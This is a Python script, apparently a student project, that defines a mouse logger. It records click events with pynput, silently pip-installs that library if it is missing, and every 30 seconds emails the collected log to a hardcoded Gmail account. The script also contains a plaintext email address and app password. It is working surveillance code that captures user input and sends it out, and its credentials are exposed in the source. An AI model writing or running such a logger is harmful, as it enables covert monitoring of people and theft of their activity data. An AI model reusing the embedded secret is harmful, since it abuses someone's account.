try: #import necessary libraries
    import logging
    import threading
    from pynput import mouse
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "sudeeproy67@gmail.com"
    EMAIL_PASSWORD = "nusrpvxakgvnhefp"
    SEND_REPORT_EVERY = 30 
    FILENAME = "C:/Users/sudee/ISAA/output.txt"

    class MouseLogger: 
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "MouseLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_click(self, x, y, button, pressed):
            current_click = str("{0} at {1}".format('Pressed' if pressed else 'Released',x, y))
            self.appendlog(current_click)

        def report(self):
            send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def run(self):
            with mouse.Listener(on_click=self.on_click) as listener:
                self.report()
                listener.join()

    Mouselogger = MouseLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Mouselogger.run()